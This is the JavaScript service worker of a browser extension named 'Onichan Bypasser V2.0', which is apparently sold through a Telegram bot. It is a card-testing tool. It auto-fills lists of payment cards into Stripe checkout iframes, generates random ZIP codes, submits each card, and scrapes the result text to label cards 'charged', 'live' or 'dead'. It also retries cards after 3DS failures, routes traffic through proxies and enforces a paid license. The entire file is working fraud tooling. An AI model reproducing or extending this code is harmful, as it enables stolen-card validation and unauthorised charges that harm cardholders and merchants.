// === Onichan Bypasser V2.0 — Service Worker ===
const API_BASE = 'https://6cb67840-8f90-4a25-8429-c01871a517a5-00-ahul1e8n76y8.riker.replit.dev';

// ---------- Active automation runs ----------
const RUNS = new Map(); // tabId -> {cards, idx, settings, running, sessionStats, startedAt}

// ---------- Lifecycle ----------
chrome.runtime.onInstalled.addListener(async () => {
  const cfg = await chrome.storage.local.get(null);
  if (!cfg.history) await chrome.storage.local.set({history: []});
  if (!cfg.stats) await chrome.storage.local.set({
    stats: {total:0, charged:0, live:0, dead:0}
  });
  if (!cfg.notifications) await chrome.storage.local.set({notifications: []});
  chrome.alarms.create('license_check', {periodInMinutes: 720});
  applyAll();
});
chrome.runtime.onStartup.addListener(applyAll);
chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === 'license_check') await revalidateLicense();
});

chrome.tabs.onRemoved.addListener(tabId => RUNS.delete(tabId));

// ---------- License re-validation ----------
async function revalidateLicense() {
  const cfg = await chrome.storage.local.get(['licenseKey','licenseExpiry']);
  if (!cfg.licenseKey) return;
  try {
    const res = await fetch(`${API_BASE}/api/bypasser/validate`, {
      method: 'POST', headers: {'Content-Type':'application/json'},
      body: JSON.stringify({key: cfg.licenseKey})
    });
    const data = await res.json();
    if (data.valid && data.expires_at) {
      const newExp = new Date(data.expires_at).getTime();
      const oldExp = cfg.licenseExpiry ? new Date(cfg.licenseExpiry).getTime() : 0;
      if (newExp > oldExp) {
        await chrome.storage.local.set({
          licenseExpiry: data.expires_at, licenseTier: data.tier || 'PREMIUM',
          lastValidatedAt: Date.now()
        });
      }
    }
  } catch (e) { console.warn('[Onichan] License recheck failed:', e); }
  const exp = cfg.licenseExpiry ? new Date(cfg.licenseExpiry).getTime() : 0;
  if (exp && exp < Date.now()) {
    await chrome.storage.local.set({licenseKey:null, licenseExpiry:null, licenseTier:null});
    notify('License expired 💔', 'Renew via @Onichanbabybot');
    await clearProxy();
  }
}

// ---------- Apply config (proxy + UA) ----------
async function applyAll() {
  const cfg = await chrome.storage.local.get(null);
  if (cfg.proxy && cfg.proxy.enabled) await applyProxy(cfg.proxy);
}
async function applyProxy(proxy) {
  if (!proxy?.enabled || !proxy.host || !proxy.port) return clearProxy();
  const scheme = proxy.type==='https'?'https':proxy.type==='socks4'?'socks4':proxy.type==='socks5'?'socks5':'http';
  try {
    await chrome.proxy.settings.set({value: {
      mode: 'fixed_servers',
      rules: { singleProxy: {scheme, host: proxy.host, port: parseInt(proxy.port)},
               bypassList: ['<-loopback>'] }
    }, scope: 'regular'});
    notify('Proxy active 🌐', `${scheme}://${proxy.host}:${proxy.port}`);
  } catch (e) { console.error('[Onichan] proxy set failed:', e); }
}
async function clearProxy() {
  try { await chrome.proxy.settings.clear({scope:'regular'}); } catch {}
}

// ============================================================
// === Stripe automation engine (cross-frame via scripting) ===
// ============================================================

// FILL — runs in EVERY frame of the tab (top + Stripe iframes)
function _fillCardInFrame(card, settings) {
  function nativeSet(el, v) {
    if (!el) return false;
    try {
      el.focus();
      // React / Stripe internal value setter
      const proto = el.tagName === 'SELECT' ? HTMLSelectElement.prototype
                  : el.tagName === 'TEXTAREA' ? HTMLTextAreaElement.prototype
                  : HTMLInputElement.prototype;
      const setter = Object.getOwnPropertyDescriptor(proto, 'value')?.set;
      if (setter) setter.call(el, v); else el.value = v;
      // Simulate real user input events so React / Stripe SDK picks up the change
      ['input','change','keyup'].forEach(type => {
        el.dispatchEvent(new Event(type, {bubbles:true}));
      });
      el.dispatchEvent(new InputEvent('input', {bubbles:true, data: v}));
      el.blur();
      return el.value === v || true; // always count as filled if no error
    } catch { return false; }
  }

  // Character-by-character simulation for Stripe Hosted Checkout (more reliable)
  function typeInto(el, v) {
    if (!el) return false;
    el.focus();
    el.value = '';
    for (const ch of String(v)) {
      el.dispatchEvent(new KeyboardEvent('keydown', {bubbles:true, key:ch}));
      el.dispatchEvent(new KeyboardEvent('keypress', {bubbles:true, key:ch}));
      const proto = HTMLInputElement.prototype;
      const setter = Object.getOwnPropertyDescriptor(proto,'value')?.set;
      if (setter) setter.call(el, el.value + ch); else el.value += ch;
      el.dispatchEvent(new Event('input', {bubbles:true}));
      el.dispatchEvent(new KeyboardEvent('keyup', {bubbles:true, key:ch}));
    }
    el.dispatchEvent(new Event('change', {bubbles:true}));
    el.blur();
    return true;
  }

  function find(selectors) {
    for (const sel of selectors) {
      try {
        const els = document.querySelectorAll(sel);
        for (const el of els) {
          if (!el.disabled && !el.readOnly &&
              (el.offsetParent !== null || el.getClientRects().length > 0)) return el;
        }
      } catch {}
    }
    return null;
  }

  let filled = 0;
  const expStr = card.mm && card.yy ? `${card.mm} / ${card.yy}` : '';
  const expStrSlash = card.mm && card.yy ? `${card.mm}/${card.yy}` : '';

  // Card number
  const num = find([
    'input[data-elements-stable-field-name="cardNumber"]',
    'input[name="cardnumber"]','input[name="cardNumber"]','input[name="number"]',
    'input[autocomplete="cc-number"]','input[id*="cardnumber" i]','input[id*="card-number" i]',
    'input[placeholder="1234 1234 1234 1234"]','input[placeholder*="1234" i]',
    'input[aria-label*="card number" i]','input[aria-label*="Card number" i]'
  ]);
  if (num) { nativeSet(num, card.num); filled++; }

  // Expiry
  const exp = find([
    'input[data-elements-stable-field-name="cardExpiry"]',
    'input[name="exp-date"]','input[name="cardExpiry"]','input[name="expiry"]',
    'input[autocomplete="cc-exp"]','input[id*="exp" i]',
    'input[placeholder="MM / YY"]','input[placeholder="MM/YY"]',
    'input[aria-label*="expir" i]','input[aria-label*="Expiry" i]','input[aria-label*="Expiration" i]'
  ]);
  if (exp && expStr) { nativeSet(exp, expStr) || nativeSet(exp, expStrSlash); filled++; }

  // CVC / CVV
  const cvc = find([
    'input[data-elements-stable-field-name="cardCvc"]',
    'input[name="cvc"]','input[name="cardCvc"]','input[name="cvv"]',
    'input[autocomplete="cc-csc"]','input[id*="cvc" i]','input[id*="cvv" i]',
    'input[placeholder="CVC"]','input[placeholder="CVV"]','input[placeholder="123"]',
    'input[aria-label*="CVC" i]','input[aria-label*="CVV" i]','input[aria-label*="security code" i]'
  ]);
  if (cvc && card.cvv) { nativeSet(cvc, card.cvv); filled++; }

  // Cardholder name
  const name = find([
    'input[name="billingName"]','input[name="cardholderName"]',
    'input[autocomplete="cc-name"]','input[name="name"]','input[autocomplete="name"]',
    'input[placeholder*="Full name" i]','input[placeholder*="Name on card" i]','input[placeholder*="cardholder" i]',
    'input[aria-label*="name" i]'
  ]);
  if (name && settings?.fillName && !name.value) nativeSet(name, settings.fillName);

  // Email (top frame only, skip if already filled)
  const email = find([
    'input[type="email"]','input[name="email"]','input[autocomplete="email"]',
    'input[placeholder*="email" i]','input[aria-label*="email" i]'
  ]);
  if (email && settings?.fillEmail && !email.value) nativeSet(email, settings.fillEmail);

  // Postal / ZIP (randomize if empty)
  const zip = find([
    'input[name="postalCode"]','input[name="postal-code"]','input[name="zip"]',
    'input[autocomplete="postal-code"]','input[placeholder*="ZIP" i]','input[placeholder*="postal" i]'
  ]);
  if (zip && !zip.value) nativeSet(zip, String(10000 + Math.floor(Math.random() * 89999)));

  return { filled, frame: location.href.slice(0,60) };
}

// CLICK SUBMIT — top frame only
function _clickSubmitInFrame() {
  const candidates = [
    'button[data-testid="hosted-payment-submit-button"]',
    'button.SubmitButton','button[class*="SubmitButton"]',
    'form button[type="submit"]','button[type="submit"]',
    '[role="button"][data-testid*="submit"]',
    'form button:not([type="button"]):not([disabled])'
  ];
  for (const sel of candidates) {
    const btn = document.querySelector(sel);
    if (btn && btn.offsetParent !== null && !btn.disabled) {
      btn.click();
      return {clicked: true, selector: sel};
    }
  }
  return {clicked: false};
}

// DETECT — runs in every frame, returns first match
function _detectStatusInFrame() {
  const text = (document.body && document.body.innerText || '').toLowerCase();
  if (!text) return null;
  if (/payment (succeeded|complete|approved)|thank you for your (order|purchase)|order (complete|confirmed)|charge (success|approved)/.test(text))
    return {status: 'charged', message: 'Payment succeeded'};
  if (/your card was declined|card.*declined|do not honor|insufficient funds|generic_decline|card_declined/.test(text))
    return {status: 'dead', message: 'Card declined'};
  if (/incorrect cvc|invalid cvc|cvc.*not match|cvv.*incorrect|cvc_check.*fail/.test(text))
    return {status: 'live', message: 'CVC incorrect (live)'};
  if (/(3d secure|three.?d.?secure|authenticat).*(fail|unable|invalid)/.test(text))
    return {status: 'dead', message: '3DS failed'};
  if (/3d secure|verify your card|authenticate your card|stripe-3ds/.test(text))
    return {status: 'live', message: '3DS challenge (live)'};
  if (/expired card|card.*expired|invalid expir|expired_card/.test(text))
    return {status: 'dead', message: 'Expired'};
  if (/incorrect_number|invalid card number|invalid_number/.test(text))
    return {status: 'dead', message: 'Invalid number'};
  if (/processing_error|try again/.test(text))
    return {status: 'dead', message: 'Processing error'};
  return null;
}

// Get all frame IDs in a tab (includes cross-origin Stripe iframes)
async function getAllFrameIds(tabId) {
  try {
    const frames = await chrome.webNavigation.getAllFrames({tabId});
    return (frames || []).map(f => f.frameId);
  } catch { return [0]; }
}

// Primary: send message to content.js in EACH frame (works in cross-origin iframes)
// Fallback: chrome.scripting.executeScript (works if scripting allowed)
async function injectFill(tabId, card, settings) {
  const frameIds = await getAllFrameIds(tabId);
  let total = 0;

  // Method 1 — message to content.js in each frame (most reliable in Kiwi)
  for (const frameId of frameIds) {
    try {
      const res = await new Promise((resolve) => {
        chrome.tabs.sendMessage(tabId, {type:'FILL_CARD', card, settings},
          {frameId}, (r) => resolve(chrome.runtime.lastError ? null : r));
      });
      if (res?.filled) total += res.filled;
    } catch {}
  }
  if (total > 0) return total;

  // Method 2 — scripting fallback (may not reach cross-origin frames)
  try {
    const results = await chrome.scripting.executeScript({
      target: {tabId, allFrames: true},
      func: _fillCardInFrame, args: [card, settings]
    });
    total = results.reduce((s, r) => s + (r?.result?.filled || 0), 0);
  } catch {}

  return total;
}

async function injectClickSubmit(tabId) {
  // Send to frame 0 (top frame) first
  try {
    const res = await new Promise((resolve) => {
      chrome.tabs.sendMessage(tabId, {type:'CLICK_SUBMIT'}, {frameId: 0},
        (r) => resolve(chrome.runtime.lastError ? null : r));
    });
    if (res?.clicked) return true;
  } catch {}
  // Fallback: scripting
  try {
    const r = await chrome.scripting.executeScript({
      target: {tabId, allFrames: false}, func: _clickSubmitInFrame
    });
    return r[0]?.result?.clicked || false;
  } catch { return false; }
}

async function injectDetect(tabId) {
  const frameIds = await getAllFrameIds(tabId);
  // Check each frame for result text
  for (const frameId of frameIds) {
    try {
      const res = await new Promise((resolve) => {
        chrome.tabs.sendMessage(tabId, {type:'DETECT_STATUS'}, {frameId},
          (r) => resolve(chrome.runtime.lastError ? null : r));
      });
      if (res?.status) return res;
    } catch {}
  }
  // Fallback: scripting
  try {
    const results = await chrome.scripting.executeScript({
      target: {tabId, allFrames: true}, func: _detectStatusInFrame
    });
    for (const r of results) if (r?.result) return r.result;
  } catch {}
  return null;
}

// === Main loop per tab ===
async function startRun(tabId, cards, settings) {
  if (RUNS.has(tabId) && RUNS.get(tabId).running) {
    return {ok: false, error: 'Already running on this tab'};
  }
  const run = {
    cards, idx: 0, settings, running: true, paused: false,
    sessionStats: {total:0, charged:0, live:0, dead:0},
    startedAt: Date.now()
  };
  RUNS.set(tabId, run);
  notifyOverlay(tabId, 'RUN_STARTED', {total: cards.length});
  loop(tabId).catch(e => console.error('[Onichan] loop error:', e));
  return {ok: true, started: cards.length};
}

async function loop(tabId) {
  const run = RUNS.get(tabId);
  if (!run) return;
  while (run.running && run.idx < run.cards.length) {
    if (run.paused) { await sleep(500); continue; }
    const card = run.cards[run.idx];
    run.idx++;
    // 1) Fill card across all frames — with retry if page is still loading
    notifyOverlay(tabId, 'CARD_START', {card: maskCard(card.num), idx: run.idx, total: run.cards.length, status:'filling'});
    let filled = await injectFill(tabId, card, run.settings);
    if (filled === 0) {
      // Retry after 2.5s — Stripe iframes may still be mounting
      notifyOverlay(tabId, 'WAITING_RESPONSE', {card: maskCard(card.num), status: 'retrying'});
      await sleep(2500);
      filled = await injectFill(tabId, card, run.settings);
    }
    if (filled === 0) {
      // Third attempt after another 2s
      await sleep(2000);
      filled = await injectFill(tabId, card, run.settings);
    }
    if (filled === 0) {
      notifyOverlay(tabId, 'CARD_RESULT', {
        card: maskCard(card.num), status: 'dead',
        message: 'Page not ready — reload Stripe checkout and try again'
      });
      run.sessionStats.total++; run.sessionStats.dead++;
      await recordResult(maskCard(card.num), 'dead', 'Stripe', 'Page not ready');
      // Stop the run so user can reload and restart
      run.running = false;
      notifyOverlay(tabId, 'RUN_STOPPED', {reason:'Page not ready — reload Stripe checkout'});
      break;
    }
    await sleep(800);

    // 2) Click submit
    await injectClickSubmit(tabId);
    notifyOverlay(tabId, 'WAITING_RESPONSE', {card: maskCard(card.num)});

    // 3) Wait up to 18s for status text in any frame
    const t0 = Date.now();
    let result = null;
    while (Date.now() - t0 < 18000) {
      result = await injectDetect(tabId);
      if (result) break;
      await sleep(700);
    }
    if (!result) result = {status: 'dead', message: 'timeout'};

    run.sessionStats.total++;
    if (result.status === 'charged') run.sessionStats.charged++;
    else if (result.status === 'live') run.sessionStats.live++;
    else run.sessionStats.dead++;

    notifyOverlay(tabId, 'CARD_RESULT', {
      card: maskCard(card.num), status: result.status, message: result.message,
      stats: run.sessionStats
    });
    await recordResult(maskCard(card.num), result.status, 'Stripe', result.message);

    // 3DS dead → re-add card if 3DS bypass enabled
    if (result.message?.includes('3DS') && result.status === 'dead' && run.settings?.threeDsToggle) {
      run.cards.push(card);
    }

    if (result.status === 'charged' && run.settings?.opt_celebrate !== false) {
      // stop on charged unless user wants continuous
      break;
    }
    await sleep(2000);
  }
  run.running = false;
  notifyOverlay(tabId, 'RUN_DONE', {stats: run.sessionStats});
}

function stopRun(tabId) {
  const run = RUNS.get(tabId);
  if (run) { run.running = false; }
  notifyOverlay(tabId, 'RUN_STOPPED', {});
  return {ok: true};
}

function notifyOverlay(tabId, event, data) {
  chrome.tabs.sendMessage(tabId, {type: 'OVERLAY_EVENT', event, data}).catch(()=>{});
}

function maskCard(num) {
  const n = String(num||'').replace(/\D/g,'');
  if (n.length < 8) return n;
  return n.slice(0,4) + '****' + n.slice(-4);
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ---------- Stats / history ----------
async function recordResult(card, status, gateway, message) {
  const cfg = await chrome.storage.local.get(['stats','history','opt_notif']);
  const stats = cfg.stats || {total:0, charged:0, live:0, dead:0};
  stats.total += 1;
  if (status === 'charged') stats.charged += 1;
  else if (status === 'live') stats.live += 1;
  else if (status === 'dead') stats.dead += 1;
  const history = cfg.history || [];
  history.unshift({card, status, gateway, message, time: Date.now()});
  if (history.length > 500) history.length = 500;
  await chrome.storage.local.set({stats, history});

  chrome.runtime.sendMessage({type:'stats_updated',
    celebrate: status === 'charged' ? 'charged' : status === 'live' ? 'live' : null
  }).catch(()=>{});

  if (cfg.opt_notif !== false && (status==='charged'||status==='live')) {
    notify(status==='charged' ? '💗 CHARGED!' : '💜 LIVE HIT!', `${gateway}: ${card}`);
  }
}

async function pushNotification(title, message) {
  const cfg = await chrome.storage.local.get(['notifications']);
  const n = cfg.notifications || [];
  n.unshift({title, message, time: Date.now()});
  if (n.length > 50) n.length = 50;
  await chrome.storage.local.set({notifications: n});
}

// ---------- Messaging ----------
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  (async () => {
    try {
      switch (msg.type) {
        case 'license_activated': await applyAll(); break;
        case 'license_revoked': await clearProxy(); break;
        case 'proxy_apply': await applyProxy(msg.proxy); break;
        case 'proxy_clear': await clearProxy(); break;
        case 'config_changed': await applyAll(); break;
        case 'START_AUTOMATION': {
          // tabId can come from popup (explicit) or content script (sender.tab.id)
          const tabId = msg.tabId || (sender.tab && sender.tab.id);
          if (!tabId) { sendResponse({ok:false, error:'No tab ID — open a Stripe checkout page'}); return; }
          const r = await startRun(tabId, msg.cards, msg.settings);
          sendResponse(r); return;
        }
        case 'STOP_AUTOMATION': {
          const tabId = msg.tabId || (sender.tab && sender.tab.id);
          const r = stopRun(tabId);
          sendResponse(r); return;
        }
        case 'GET_RUN_STATE': {
          const tabId = msg.tabId || (sender.tab && sender.tab.id);
          sendResponse({ok:true, run: RUNS.get(tabId) || null}); return;
        }
        case 'GET_SETTINGS': {
          const cfg = await chrome.storage.local.get(null);
          sendResponse({ok: true, settings: cfg}); return;
        }
        case 'CARD_RESULT':
          await recordResult(msg.card, msg.status, msg.gateway, msg.message); break;
        case 'NOTIFY':
          await pushNotification(msg.title, msg.message);
          if (msg.show !== false) notify(msg.title, msg.message); break;
        case 'bypass_log': {
          const host = msg.host || (sender.tab && sender.tab.url ? new URL(sender.tab.url).hostname : 'unknown');
          await pushNotification('Bypass: '+host, msg.kind || 'captcha'); break;
        }
      }
      sendResponse({ok:true});
    } catch (e) {
      sendResponse({ok:false, error: e.message});
    }
  })();
  return true;
});

function notify(title, message) {
  try {
    chrome.notifications.create({
      type: 'basic',
      iconUrl: chrome.runtime.getURL('icons/icon128.png'),
      title, message, priority: 1
    });
  } catch {}
}
